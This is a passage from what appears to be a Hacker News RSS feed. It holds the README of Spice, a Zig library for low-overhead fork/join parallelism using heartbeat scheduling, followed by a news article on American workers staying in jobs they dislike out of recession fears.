<li><a href="#global-mutex-is-fine-when-theres-no-contention">Global mutex is fine when there's no contention</a></li>
<li><a href="#branch-free-doubly-linked-list">Branch-free doubly-linked list</a></li>
<li><a href="#minimizing-the-stack-usage">Minimizing the stack usage</a></li>
<li><a href="#passing-values-around-in-registers">Passing values around in registers</a></li>
</ul>
</li>
<li><a href="#benchmarks">Benchmarks</a></li>
<li><a href="#acknowledgments">Acknowledgments</a></li>
<li><a href="#limitations">Limitations</a></li>
<li><a href="#faq">FAQ</a></li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Using Spice</h2><a id="user-content-using-spice" aria-label="Permalink: Using Spice" href="#using-spice"></a></p>
<p dir="auto">The following example demonstrates how Spice works:</p>
<div dir="auto" data-snippet-clipboard-copy-content="const spice = @import(&quot;spice&quot;);

// (1) Add task as a parameter.
fn sum(t: *spice.Task, node: *const Node) i64 {
    var res: i64 = node.val;

    if (node.left) |left_child| {
        if (node.right) |right_child| {
            var fut = spice.Future(*const Node, i64).init();

            // (3) Call `fork` to set up work for another thread.
            fut.fork(t, sum, right_child);

            // (4) Do some work yourself.
            res += t.call(i64, sum, left_child);

            if (fut.join(t)) |val| {
                // (5) Wait for the other thread to complete the work.
                res += val;
            } else {
                // (6) ... or do it yourself.
                res += t.call(i64, sum, right_child);
            }
            return res;
        }

        res += t.call(i64, sum, left_child);
    }

    if (node.right) |right_child| {
        // (2) Recursive calls must use `t.call`
        res += t.call(i64, sum, right_child);
    }

    return res;
}"><pre><span>const</span> <span>spice</span> <span>=</span> <span>@import</span>(<span>"spice"</span>);

<span>// (1) Add task as a parameter.</span>
<span>fn</span> <span>sum</span>(<span>t</span>: <span>*</span><span>spice.Task</span>, <span>node</span>: <span>*</span><span>const</span> <span>Node</span>) <span>i64</span> {
    <span>var</span> <span>res</span>: <span>i64</span> <span>=</span> <span>node</span>.<span>val</span>;

    <span>if</span> (<span>node</span>.<span>left</span>) <span>|</span><span>left_child</span><span>|</span> {
        <span>if</span> (<span>node</span>.<span>right</span>) <span>|</span><span>right_child</span><span>|</span> {
            <span>var</span> <span>fut</span> <span>=</span> <span>spice</span>.<span>Future</span>(<span>*</span><span>const</span> <span>Node</span>, <span>i64</span>).<span>init</span>();

            <span>// (3) Call `fork` to set up work for another thread.</span>
            <span>fut</span>.<span>fork</span>(<span>t</span>, <span>sum</span>, <span>right_child</span>);

            <span>// (4) Do some work yourself.</span>
            <span>res</span> <span>+=</span> <span>t</span>.<span>call</span>(<span>i64</span>, <span>sum</span>, <span>left_child</span>);

            <span>if</span> (<span>fut</span>.<span>join</span>(<span>t</span>)) <span>|</span><span>val</span><span>|</span> {
                <span>// (5) Wait for the other thread to complete the work.</span>
                <span>res</span> <span>+=</span> <span>val</span>;
            } <span>else</span> {
                <span>// (6) ... or do it yourself.</span>
                <span>res</span> <span>+=</span> <span>t</span>.<span>call</span>(<span>i64</span>, <span>sum</span>, <span>right_child</span>);
            }
            <span>return</span> <span>res</span>;
        }

        <span>res</span> <span>+=</span> <span>t</span>.<span>call</span>(<span>i64</span>, <span>sum</span>, <span>left_child</span>);
    }

    <span>if</span> (<span>node</span>.<span>right</span>) <span>|</span><span>right_child</span><span>|</span> {
        <span>// (2) Recursive calls must use `t.call`</span>
        <span>res</span> <span>+=</span> <span>t</span>.<span>call</span>(<span>i64</span>, <span>sum</span>, <span>right_child</span>);
    }

    <span>return</span> <span>res</span>;
}</pre></div>
<ol dir="auto">
<li>Every parallel function needs to take a <em>task</em> as a parameter.
This is used to coordinate the work.</li>
<li>You should never call your function directly, but instead use <code>t.call</code> which will call it for you (in the right way).</li>
<li>Call <code>fork</code> to set up a piece of work which can be done by a different thread.
This can be called multiple times to set up multiple pieces of work.</li>
<li>After that your function should do some meaningful work itself.</li>
<li>Call <code>join</code> to wait for the work done by the other thread.</li>
<li><em>However</em>, <code>join</code> might return <code>null</code> and this signals that <em>no other thread picked up the work</em>.
In this case you must do the work yourself.</li>
</ol>
<p dir="auto">Here we repeat ourselves in step 3 and 6:
Both places we refer to <code>sum</code> and <code>right_child</code>.
It's possible to hide this duplication by some helper function, <em>but</em> this example demonstrates a core idea behind Spice:</p>
<p dir="auto"><strong>Not every piece of work comes from the queue.</strong>
You call <code>fork</code> to signal that there's something which <em>can</em> be executed by another thread, but if all the other threads are busy then you fallback to executing it as if the fork never happened.</p>
<p dir="auto">This principle is core to how Spice achieves its low and predictable overhead:
If there's no parallelism possible then all Spice is doing on the hot path is pushing and popping the queue (without ever looking at any of the items).</p>
<p dir="auto">The actually coordination with other threads happens on a <em>fixed heartbeat</em>:
Every 100 microsecond or so a thread will look at its current work queue and dispatch the top-most item to another waiting thread.
Since the heartbeat happens very infrequently (compared to the clock speed) we also don't need to worry so much about what we're doing during the heartbeat.
Even if we spend <em>hundreds</em> of nanoseconds the <em>total</em> overhead becomes small since we do it rarely.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Work-stealing and its inefficiencies</h2><a id="user-content-work-stealing-and-its-inefficiencies" aria-label="Permalink: Work-stealing and its inefficiencies" href="#work-stealing-and-its-inefficiencies"></a></p>
<p dir="auto">Spice provides the <a href="https://en.wikipedia.org/wiki/Fork%E2%80%93join_model" rel="nofollow">fork/join model</a> which has typically been implementing by using <a href="https://en.wikipedia.org/wiki/Work_stealing" rel="nofollow"><strong>work-stealing</strong></a>.
Let's have a look at work-stealing:</p>
<ul dir="auto">
<li>Every thread have their own local <em>work queue</em>.
Every piece of work in the system gets put onto this queue.</li>
<li>The same thread will pick up work from this queue and execute it.
This might lead to more work being added (onto the same queue).</li>
<li>At some point, the local work queue for a thread will become empty.
The thread will then attempt to <em>steal</em> work from another thread:
It takes a chunk of the work from the <em>end</em> of another thread's queue and places it into its own.</li>
<li>Since each thread pulls work from the <em>beginning</em> of its queue and other thread steals from the <em>end</em>, we expect there to be little contention on these queues.</li>
</ul>
<p dir="auto">However, there's three major sources of inefficiencies in this design:</p>
<p dir="auto"><strong>Every piece of work is a <em>dynamic dispatch</em>.</strong>
In compiled languages (such as C) function calls are "practically" free due to the capability of statically knowing everything about the called function.
This is a scenario which compilers and CPUs have been optimized for <em>decades</em> to execute efficiently.
Work-stealing systems <em>don't</em> use this functionality, but instead puts every piece of work into generic "call this dynamic function".
It's a small piece of overhead, but it does add up.</p>
<p dir="auto"><strong>The "local" work queue isn't really local.</strong>
Yes, it's true that every thread have a single queue that they will push work onto, <em>but</em> this is far from a "local" queue as is typically described in concurrent algorithms.
This is a queue in which <em>every</em> thread at <em>every</em> point might steal from.
In reality, work-stealing systems with N threads have N global queues, where each queue only has a single producer, but everyone is a consumer.
Why does this distinction matter?
<em>Because all operations on these queues have to use atomic operations.</em>
Atomic operations, especially stores, are far more expensive than regular, <em>local</em> stores.</p>
<p dir="auto"><strong>Spinning works great … until it doesn't.</strong>
The queues in work-stealing systems are typically implemented using <em>spinning</em>:
Every thread will optimistically try to acquire a single item from the queue, and if there's a contention with another thread it will <em>try again</em> in a loop.
This typically gives great performance … <strong>until it doesn't</strong>.
It can be very hard to reason about this or replicate it since under one set of conditions everything is fine, but <em>suddenly</em> during contention the system will slow down to a halt (i.e. 10x-100x slower).</p>
<p dir="auto">Spice directly tackles all of these inefficiencies:</p>
<ol dir="auto">
<li>The dynamic dispatch of the work queue is only used when work is sent to another thread.
Work done <em>within</em> a single thread will use regular function calls outside of the work queue.</li>
<li>The work queue is truly local:
Pushing to it involves (1) one memory store to a pointer to somewhere on the stack, (2) one memory store to the current stack frame, (3) one register store.
None of these operations need to synchronize with other threads.</li>
<li>There isn't a single <code>while</code>-loop in Spice which doesn't also contain a <code>wait()</code>-call which will suspend the thread.
There is no spinning.</li>
</ol>
<p dir="auto"><h2 tabindex="-1" dir="auto">Implementation details</h2><a id="user-content-implementation-details" aria-label="Permalink: Implementation details" href="#implementation-details"></a></p>
<p dir="auto">Let's dive further into how Spice is implemented to achieve its efficient parallelism.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Optimizing for static dispatch</h3><a id="user-content-optimizing-for-static-dispatch" aria-label="Permalink: Optimizing for static dispatch" href="#optimizing-for-static-dispatch"></a></p>
<p dir="auto">A fork/join program has a set of code blocks which are executed in parallel and once they finish the <code>join</code> action completes:</p>
<div data-snippet-clipboard-copy-content="join(
  fork { code1 }
  fork { code2 }
  fork { code3 }
)"><pre><code>join(
  fork { code1 }
  fork { code2 }
  fork { code3 }
)
</code></pre></div>
<p dir="auto">In Spice this is represented as:</p>
<div data-snippet-clipboard-copy-content="job1 = fork { code1 }  // Place on the queue
job2 = fork { code2 }  // Place on the queue

code3 // Run right away

if (job2.isExecuting()) {
  // Job was picked up by another thread. Wait for it.
  job2.wait()
} else {
  code2
}

if (job1.isExecuting()) {
  // Job was picked up by another thread. Wait for it.
  job1.wait()
} else {
  code1
}"><pre><code>job1 = fork { code1 }  // Place on the queue
job2 = fork { code2 }  // Place on the queue

code3 // Run right away

if (job2.isExecuting()) {
  // Job was picked up by another thread. Wait for it.
  job2.wait()
} else {
  code2
}

if (job1.isExecuting()) {
  // Job was picked up by another thread. Wait for it.
  job1.wait()
} else {
  code1
}
</code></pre></div>
<p dir="auto">Notice that <code>code1</code> and <code>code2</code> has been duplicated_inside the function.
This is actually a <em>good</em> thing.
Most of the time the job will <em>not</em> be picked up by another thread.
In this case, our program nicely turns into the sequential version (although in reverse order) with a few extra branches which are all very predictable.
This is friendly both for the code optimizer (e.g. it can now inline the function call) and the CPU.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Low-overhead heartbeating signaling</h3><a id="user-content-low-overhead-heartbeating-signaling" aria-label="Permalink: Low-overhead heartbeating signaling" href="#low-overhead-heartbeating-signaling"></a></p>
<p dir="auto">The core idea of heartbeat scheduling is to do scheduling <em>locally</em> and at a <em>low frequency</em>:
Every 100 microsecond or so we'd like every thread to look at it local work queue and send work to a different thread.
The low frequency is key to eliminating overall overhead.
If we're only doing something every 100 microsecond we can actually spend 100 nanoseconds (an eternity!) and still only introduce 0.1% overhead.</p>
<p dir="auto">Operating systems have built-in support for <em>signaling</em>, but these are very hard to reason about.
The user code gets paused at <em>any</em> random point and it's hard to safely continue running.
For this reason, Spice uses a cooperative approach instead:
The user code have to call <code>tick()</code> and this detects whether a heartbeat should happen.
This function call is automatically called for you whenever you use the <code>call</code>-helper.</p>
<p dir="auto">It's critical that this function is efficient when a heartbeat <strong>isn't</strong> happening.
This is after all the common case (as the heartbeat is only happening every ~100 microsecond).</p>
<div dir="auto" data-snippet-clipboard-copy-content="pub inline fn tick(self: *Task) void {
    if (self.worker.heartbeat.load(.monotonic)) {
        self.worker.pool.heartbeat(self.worker);
    }
}"><pre><span>pub</span> <span>inline</span> <span>fn</span> <span>tick</span>(<span>self</span>: <span>*</span><span>Task</span>) <span>void</span> {
    <span>if</span> (<span>self</span>.<span>worker</span>.<span>heartbeat</span>.<span>load</span>(<span>.monotonic</span>)) {
        <span>self</span>.<span>worker</span>.<span>pool</span>.<span>heartbeat</span>(<span>self</span>.<span>worker</span>);
    }
}</pre></div>
<p dir="auto">In Spice we spawn a separate heartbeat thread whose sole purpose is to periodically flip the thread's atomic heartbeat value from <code>false</code> to <code>true</code>.
The <code>tick()</code> function then reads this atomic value and starts its heartbeat code when it's <code>true</code>.</p>
<p dir="auto">A key part of reducing the overhead of the ticking is to make sure the heartbeat function itself is marked as <em>cold</em>.
This causes the presence of this function call to not use up any registers.
Without this the overhead is significantly higher.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Global mutex is fine when there's no contention</h3><a id="user-content-global-mutex-is-fine-when-theres-no-contention" aria-label="Permalink: Global mutex is fine when there's no contention" href="#global-mutex-is-fine-when-theres-no-contention"></a></p>
<p dir="auto">If you look inside the codebase of Spice you will find that each thread pool has a single mutex which is locked all over the place.
An immediate reaction would be "oh no, a global mutex is terrible" and you might be tempted to replace it.</p>
<p dir="auto"><em>However</em>, there's no problem with a global mutex <em>until you're being blocked</em>.
And you can only be blocked if two conditions occur:</p>
<ol dir="auto">
<li>A thread is holding the lock for a <em>long</em> time.</li>
<li>There's concurrent threads trying to acquire the lock at the same time.</li>
</ol>
<p dir="auto"><strong>None</strong> of these are true for Spice.
The heartbeating ensures that typically only a single thread is executing a heartbeat.
In addition, no user code is executed while the lock is held.
We're only protecting trivial simple memory reads/writes which will complete in constant time.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Branch-free doubly-linked list</h3><a id="user-content-branch-free-doubly-linked-list" aria-label="Permalink: Branch-free doubly-linked list" href="#branch-free-doubly-linked-list"></a></p>
<p dir="auto">We're using a doubly-linked list to keep track of the work queue:
<code>fork()</code> appends to the end, <code>join()</code> pops from the end (if it's still there), and we pop from the <em>beginning</em> when we want to send work to a background worker.</p>
<p dir="auto"><a href="https://github.com/ziglang/zig/blob/cb308ba3ac2d7e3735d1cb42ef085edb1e6db723/lib/std/linked_list.zig#L267-L275">Appending into a doubly-linked list</a> typically looks like this:</p>
<div dir="auto" data-snippet-clipboard-copy-content="pub fn append(list: *Self, new_node: *Node) void {
    if (list.last) |last| {
        // Insert after last.
        list.insertAfter(last, new_node);
    } else {
        // Empty list.
        list.prepend(new_node);
    }
}"><pre><span>pub</span> <span>fn</span> <span>append</span>(<span>list</span>: <span>*</span><span>Self</span>, <span>new_node</span>: <span>*</span><span>Node</span>) <span>void</span> {
    <span>if</span> (<span>list</span>.<span>last</span>) <span>|</span><span>last</span><span>|</span> {
        <span>// Insert after last.</span>
        <span>list</span>.<span>insertAfter</span>(<span>last</span>, <span>new_node</span>);
    } <span>else</span> {
        <span>// Empty list.</span>
        <span>list</span>.<span>prepend</span>(<span>new_node</span>);
    }
}</pre></div>
<p dir="auto">Notice that there's a conditional here: If the list is empty we need to do something special.
Most of the time the list will of course <em>not</em> be empty.
To eliminate the branch we can make sure that the list is <em>never</em> empty.
We define a sentinel node (the "head") which always represents the beginning of the list.
The tail pointer will start by pointing to this head node.</p>
<p dir="auto">This means that both pushing and popping is completely branch-free and these are operations we do at <em>every</em> recursive function call.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Minimizing the stack usage</h3><a id="user-content-minimizing-the-stack-usage" aria-label="Permalink: Minimizing the stack usage" href="#minimizing-the-stack-usage"></a></p>
<p dir="auto">A <code>Future</code> in Spice has two possible states: It's either <em>queued</em> or <em>executing</em>.
The heartbeat is responsible for taking a <em>queued</em> future and start <em>executing</em> it.
And as we already know: Heartbeating happens rarely so we expect many futures to be queued without executing.</p>
<p dir="auto">An early prototype of Spice used a <em>tagged union</em> to store the future on the stack.
This turns out to be suboptimal because (1) stack usage matters for performance (at least in this benchmark) and (2) there's quite a lot of additional state needed to keep track of futures which are <em>executing</em>.</p>
<p dir="auto">To minimize stack usage Spice therefore uses two techniques:</p>
<ol dir="auto">
<li>Execution state is placed in a separate (pool-allocated) struct.
The queued (but not executed) futures therefore does not need to consume any of this space.</li>
<li>We manually create a tagged union where we use the fact that the <em>executing</em> state only needs a single pointer while the <em>queued</em> state is guaranteed to have a <code>prev</code> pointer.
Whether the first field is <code>null</code> therefore decides which of these it is.
(Maybe a smart enough compiler would be able to this optimization for us.)</li>
</ol>
<div dir="auto" data-snippet-clipboard-copy-content="const Future = struct {
    prev_or_null: ?*anyopaque,
    next_or_state: ?*anyopaque,
}

// A future which is _queued_ has:
//   prev_or_null = pointer to prev future
//   next_or_state = pointer to next future

// A future which is _executing_ has:
//   prev_or_null = null
//   next_or_state = ExecuteState

const ExecuteState = struct {
    requester: *Worker,
    done: std.Thread.ResetEvent = .{},
    result: ResultType,
    // Any number of fields.
}"><pre><span>const</span> <span>Future</span> <span>=</span> <span>struct</span> {
    <span>prev_or_null</span>: <span>?</span><span>*</span><span>anyopaque</span>,
    <span>next_or_state</span>: <span>?</span><span>*</span><span>anyopaque</span>,
}

<span>// A future which is _queued_ has:</span>
<span>//   prev_or_null = pointer to prev future</span>
<span>//   next_or_state = pointer to next future</span>

<span>// A future which is _executing_ has:</span>
<span>//   prev_or_null = null</span>
<span>//   next_or_state = ExecuteState</span>

<span>const</span> <span>ExecuteState</span> <span>=</span> <span>struct</span> {
    <span>requester</span>: <span>*</span><span>Worker</span>,
    <span>done</span>: <span>std.Thread.ResetEvent</span> <span>=</span> .{},
    <span>result</span>: <span>ResultType</span>,
    <span>// Any number of fields.</span>
}</pre></div>
<p dir="auto"><h3 tabindex="-1" dir="auto">Passing values around in registers</h3><a id="user-content-passing-values-around-in-registers" aria-label="Permalink: Passing values around in registers" href="#passing-values-around-in-registers"></a></p>
<p dir="auto">Spice works with a <code>Task</code> struct which has two fields:
A pointer to the owning worker and a pointer to tail of the work queue.
For optimal performance these should be passed as registers across all function boundaries.
However, with LLVM, passing a struct will very often cause it be passed on the stack.</p>
<p dir="auto">To work around this we define a <em>separate</em> function where <code>worker</code> and <code>job_tail</code> are actual parameters.
We place the parameters into a struct and pass a pointer to this into the user-defined function.
This function call we make sure is always being inlined:</p>
<div dir="auto" data-snippet-clipboard-copy-content="fn callWithContext(
    worker: *Worker,
    job_tail: *Job,
    comptime T: type,
    func: anytype,
    arg: anytype,
) T {
    var t = Task{
        .worker = worker,
        .job_tail = job_tail,
    };
    return @call(.always_inline, func, .{
        &amp;t,
        arg,
    });
}"><pre><span>fn</span> <span>callWithContext</span>(
    <span>worker</span>: <span>*</span><span>Worker</span>,
    <span>job_tail</span>: <span>*</span><span>Job</span>,
    <span>comptime</span> <span>T</span>: <span>type</span>,
    <span>func</span>: <span>anytype</span>,
    <span>arg</span>: <span>anytype</span>,
) <span>T</span> {
    <span>var</span> <span>t</span> <span>=</span> <span>Task</span>{
        .<span>worker</span> <span>=</span> <span>worker</span>,
        .<span>job_tail</span> <span>=</span> <span>job_tail</span>,
    };
    <span>return</span> <span>@call</span>(<span>.always_inline</span>, <span>func</span>, .{
        <span>&amp;</span><span>t</span>,
        <span>arg</span>,
    });
}</pre></div>
<p dir="auto">This causes the <code>callWithContext</code>-function to be the <em>actual</em> function which LLVM works on, and since this has pointers are parameters it will happily pass these directly into registers.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Benchmarks</h2><a id="user-content-benchmarks" aria-label="Permalink: Benchmarks" href="#benchmarks"></a></p>
<p dir="auto">The initial development of Spice has been focused around a single benchmark which is described in detail in <a href="https://github.com/judofyr/spice/blob/main/bench">bench/</a>.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Acknowledgments</h2><a id="user-content-acknowledgments" aria-label="Permalink: Acknowledgments" href="#acknowledgments"></a></p>
<p dir="auto">Spice was made possible thanks to the research into <em>heartbeat scheduling</em>:</p>
<p dir="auto"><a href="https://arxiv.org/abs/2307.10556" rel="nofollow">"The best multicore-parallelization refactoring you've never heard of"</a> gives an <em>excellent</em> introduction into the concepts of heartbeat scheduling.
It's a very short paper which focuses entirely on a single use case, but describes everything in a manner which can be generalized.
The solution presented in this paper is based around turning all the code into continuation-passing style which enables switching between sequential and parallel execution.
Spice started out as an experiment of this approach, but this turned out to have quite high overhead (&gt;10 nanosecond).</p>
<p dir="auto">Going backwards in time, <a href="https://www.chargueraud.org/research/2018/heartbeat/heartbeat.pdf" rel="nofollow">"Heartbeat scheduling: provable efficiency for nested parallelism"</a> was the first paper introducing "heartbeat scheduling".
This paper provides excellent information about the concepts, but the implementation is based around integrating this into an interpreter and focus is primarily on the theoretical guarantees as opposed to raw performance.</p>
<p dir="auto"><a href="https://paragon.cs.northwestern.edu/papers/2021-PLDI-TPAL-Rainey.pdf" rel="nofollow">"Task parallel assembly language for uncompromising parallelism"</a> is a follow-up paper which improves the performance by defining a custom assembly language and using OS signaling for heartbeats.
This is a fascinating line of research, but it's difficult to integrate into an existing language.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Limitations</h2><a id="user-content-limitations" aria-label="Permalink: Limitations" href="#limitations"></a></p>
<p dir="auto">There's <em>many</em> limitations of the current implementation of Spice:</p>
<ul dir="auto">
<li><strong>Rough edges when you're using it wrong:</strong> Spice is quite peculiar about how it should be used (most notably about <code>fork</code> and <code>join</code>).
If you're using it wrong now then weird things could happen.
This should be improved by adding more compile-time checking, debug-mode assertions, or changing the overall API.</li>
<li><strong>Lack of tests:</strong> Spice contains a lot of gnarly concurrent code, but has zero testing coverage.
This would have be improved before Spice can be responsibly used for critical tasks.</li>
<li><strong>Lack of support for arrays/slices:</strong> Probably <em>the</em> most common use case for fine-grained parallelism is to do something for every element of an array/slice.
There should be native, efficient support for this use case.</li>
<li><strong>Lack of documentation:</strong> There's no good documentation of how to use it.</li>
<li><strong>Lack of further benchmarks:</strong> This has only been tested on a single small benchmark.
This benchmark <em>should</em> be quite representative (see <a href="https://github.com/judofyr/spice/blob/main/bench">bench/</a> for more details), but further benchmarks are needed to validate these findings.</li>
<li><strong>@panic-heavy:</strong> Spice is quite optimistic in its error handling and uses <code>@panic</code> extensively.
To be considered a proper Zig library there needs to be way more consideration of how error cases are handled.</li>
<li><strong>Lack of testing with ReleaseSafe:</strong>
<code>ReleaseSafe</code> is an extremely nice feature of Zig.
Further benchmarking and testing is needed to understand how well Spice can work here.</li>
</ul>
<p dir="auto">Luckily the whole codebase is ~500 lines so it shouldn't be <em>too</em> difficult to make progress on these areas.</p>
<p dir="auto">There's currently no plans of doing any active development on Spice to improve this (as the original author don't have the time).
Any improvements in forks and/or re-implementations in other languages are highly encouraged!</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">FAQ</h2><a id="user-content-faq" aria-label="Permalink: FAQ" href="#faq"></a></p>
<p dir="auto"><strong>Question: Why is it called "Spice"?</strong></p>
<p dir="auto">Answer: This project enables <em>fine-grained</em> parallelism. Sand is extremely fine-grained. Sand forms in dunes. <a href="https://en.wikipedia.org/wiki/Melange_(fictional_drug)" rel="nofollow">Spice</a>.
Also: It's a hot take on parallelism.</p>
<p dir="auto"><strong>Question: Why is it implemented in Zig?</strong></p>
<p dir="auto">Answer: Why not?
This describes a <em>generic approach</em> to parallelism that should be possible to implement in multiple languages.
Maybe I'll end up implementing something similar in another language as well?
I don't know yet.
If you think this is interesting for <em>your</em> language of choice I would encourage you to explore this area.</p>
<p dir="auto"><strong>Question: But if you did it in Rust we could have <em>safe</em> parallelism?</strong></p>
<p dir="auto">Answer:
Yeah, that sounds very cool.
I'm not at all opposed to it.
<em>That said</em>, I've been exploring many different techniques and variants while developing Spice.
Many of my initial ideas were definitely not "safe" by any means, but I was able to express these ideas in Zig, look at the assembly and measure the performance in benchmarks.
I'd probably only be able to explore a fraction of the ideas if I was limited by Rust's strict semantics in the <em>initial</em> phase of this project.
If I have to turn this into a production-ready system I might decide to use Rust.</p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Workers are stuck in place because everyone is too afraid of a recession to quit (154 pts)]]></title>
            <link>https://boredbat.com/american-workers-are-stuck-in-place-because-everyone-is-too-afraid-of-a-recession-to-quit/#google_vignette</link>
            <guid>41229600</guid>
            <pubDate>Mon, 12 Aug 2024 21:36:56 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://boredbat.com/american-workers-are-stuck-in-place-because-everyone-is-too-afraid-of-a-recession-to-quit/#google_vignette">https://boredbat.com/american-workers-are-stuck-in-place-because-everyone-is-too-afraid-of-a-recession-to-quit/#google_vignette</a>, See on <a href="https://news.ycombinator.com/item?id=41229600">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>

<p>America’s job market is in a bind.</p>
<p>That’s probably no surprise to current&nbsp;job-seekers, who are having an&nbsp;increasingly tough time&nbsp;landing a new gig as&nbsp;hiring slows&nbsp;and job boards run dry.</p>
<p>The stagnation has resulted in a rise in “stuck” workers — frustrated employees who say they want to quit a job, but are staying put as the fear of a potential recession looms in the backs of their minds.</p>
<p>A 24-year-old employee working in histology named Amanda, who spoke with Business Insider, is one such worker who feels that way. She’s choosing to stay in her current role as there are limited offerings in her field, and switching employers would likely lead to her pay being cut by at least a third.</p>
<p>“I feel trapped here,” Amanda said. “I’m financially screwed if I leave, and that’s why I don’t, or can’t leave.”</p>
<p>Americans have long grumbled about their&nbsp;feelings of being stuck in an unsatisfying role, but the feeling appears to be growing: Americans are quitting their jobs at the slowest pace since the pandemic, with the quits falling to just 2.1% in July, according to the&nbsp;Bureau of Labor Statistics.</p>
<p>Yet,&nbsp;job satisfaction&nbsp;fell across 26 measures in the past year, per an annual survey from the Conference Board.</p>
<p>Google search interest for the search phrase “quitting job” is down 11% over the last year, according to data accessed from the search analytics tool Glimpse.</p>
<figure><img decoding="async" width="800" height="414" src="https://boredbat.com/wp-content/uploads/2024/08/image-12.jpeg" alt="A graph showing search interest for the phrase &quot;quitting job&quot;" srcset="https://boredbat.com/wp-content/uploads/2024/08/image-12.jpeg 800w, https://boredbat.com/wp-content/uploads/2024/08/image-12-300x155.jpeg 300w, https://boredbat.com/wp-content/uploads/2024/08/image-12-768x397.jpeg 768w, https://boredbat.com/wp-content/uploads/2024/08/image-12-463x240.jpeg 463w" sizes="(max-width: 800px) 100vw, 800px"><figcaption>Search interest for the phrase “quitting job” is down 11% over the past year.&nbsp;Google Trends/Glimpse</figcaption></figure>
<p>“Stuck at work,” meanwhile, is becoming a more common search term, with interest rising 9% in the past year.</p>
<figure><img decoding="async" width="800" height="414" src="https://boredbat.com/wp-content/uploads/2024/08/image-13.jpeg" alt="Graph showing search interest for the query &quot;stuck at work&quot;" srcset="https://boredbat.com/wp-content/uploads/2024/08/image-13.jpeg 800w, https://boredbat.com/wp-content/uploads/2024/08/image-13-300x155.jpeg 300w, https://boredbat.com/wp-content/uploads/2024/08/image-13-768x397.jpeg 768w, https://boredbat.com/wp-content/uploads/2024/08/image-13-463x240.jpeg 463w" sizes="(max-width: 800px) 100vw, 800px"><figcaption>Google searches for “stuck at work,” meanwhile, have climbed 9% over the past year.&nbsp;Google Trends/Glimpse</figcaption></figure>
<p>Membership on the subreddit r/hatemyjob has more than doubled over the past two years, with users on the community growing 30,000-strong as of August, up from 14,7000 in 2022, according to historical data from the analytics site&nbsp;SubredditStats.</p>
<p>“Stuck at a job,” one&nbsp;<a target="_blank" href="https://www.reddit.com/r/hatemyjob/comments/1c61gqh/stuck_at_a_job/" rel="noreferrer noopener">user</a>&nbsp;on the subreddit posted. “I’m no longer fond of the work I do. I feel stuck because of the money. It’s a good problem to have, I suppose.”</p>

<p>“I’m just so done with this job. I’ve tried everything to stick it out but now I just can’t do it anymore,” another&nbsp;user&nbsp;wrote, adding that they had been looking for a job related to their degree for over a year. The search hasn’t been successful, they said, citing “tough” conditions in the job market.</p>
<p>“I want to quit this job so badly but I can’t afford it.”</p>
<h2 id="1668c388-f4ea-41b3-b52d-3d3d826c4a26">Recession fears loom large</h2>
<p id="1668c388-f4ea-41b3-b52d-3d3d826c4a26">Workers have typically hunkered down when the economy slows, with recessions often tied to plunges in the quits rate, historical data from the Fed shows.</p>
<p id="1668c388-f4ea-41b3-b52d-3d3d826c4a26">The economy hasn’t fallen into a recession but fears of a coming downturn are growing. In markets, investors panicked last week, sparking a huge sell-off after&nbsp;July payrolls were lower than expected, with the unemployment rate ticking up to 4.3%.</p>
<p id="1668c388-f4ea-41b3-b52d-3d3d826c4a26">Most Americans now believe the&nbsp;economy is in a recession, a recent Affirm survey found, despite&nbsp;GDP continuing to grow&nbsp;over the second quarter.</p>
<p>Google search interest in the term “recession” has exploded 230% over the past month, Glimpse data shows.</p>
<figure><img loading="lazy" decoding="async" width="800" height="413" src="https://boredbat.com/wp-content/uploads/2024/08/image-11.jpeg" alt="Graph showing search interest for the term &quot;recession&quot;" srcset="https://boredbat.com/wp-content/uploads/2024/08/image-11.jpeg 800w, https://boredbat.com/wp-content/uploads/2024/08/image-11-300x155.jpeg 300w, https://boredbat.com/wp-content/uploads/2024/08/image-11-768x396.jpeg 768w, https://boredbat.com/wp-content/uploads/2024/08/image-11-463x239.jpeg 463w" sizes="(max-width: 800px) 100vw, 800px"><figcaption>Google search interest in “recession” has more than doubled in the past month.&nbsp;Google Trends/Glimpse</figcaption></figure>
<p>“I wouldn’t say that we’re in a recession or anything,” Raymond Lee, the CEO of the career outplacement firm Careerminds told BI. “I would say, though, that, just from my perspective, I think a lot of people are staying put in their jobs because I think that there is a lot of uncertainty … People are trying to stay where they are and not make any big moves.”</p>
<p>Korn Ferry, a consultancy that offers career transitioning and outplacement services, said it had seen an increase in inbound calls from job seekers. That’s the opposite of what the firm saw during the post-pandemic hiring boom — and it’s a solid sign the “engine is slowing down,” according to Radhika Papandreou, the president of the Korn Ferry’s North American arm.</p>
<p>In general, clients are taking longer to secure new roles and appear to be prioritizing job security, Papandreou said.</p>
<p>“People are also hesitant to leave their jobs to look at other jobs unless they feel like they’re going to get something that’s secure and for a long time,” she added. “There’s a little bit of, ‘I don’t want to be last in, first out.'”</p>
<p>Job market forecasters say the&nbsp;slowdown&nbsp;in&nbsp;hiring&nbsp;looks poised to continue,&nbsp;even if the Fed begins to loosen monetary policy. Only 15% of small businesses said they were planning on adding new jobs in July, according to the latest survey from the&nbsp;National Federation of Independent Businesses, down from a peak of over 30% recorded several years ago.</p>
<p>Visited 1,566 times, 987 visit(s) today</p>


<p itemprop="dateModified">Last modified: August 11, 2024</p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[NASA investigation finds Boeing hindering Americans' return to moon (429 pts)]]></title>
            <link>https://www.flyingmag.com/modern/nasa-investigation-finds-boeing-hindering-americans-return-to-moon/</link>
            <guid>41229049</guid>
            <pubDate>Mon, 12 Aug 2024 20:38:27 GMT</pubDate>
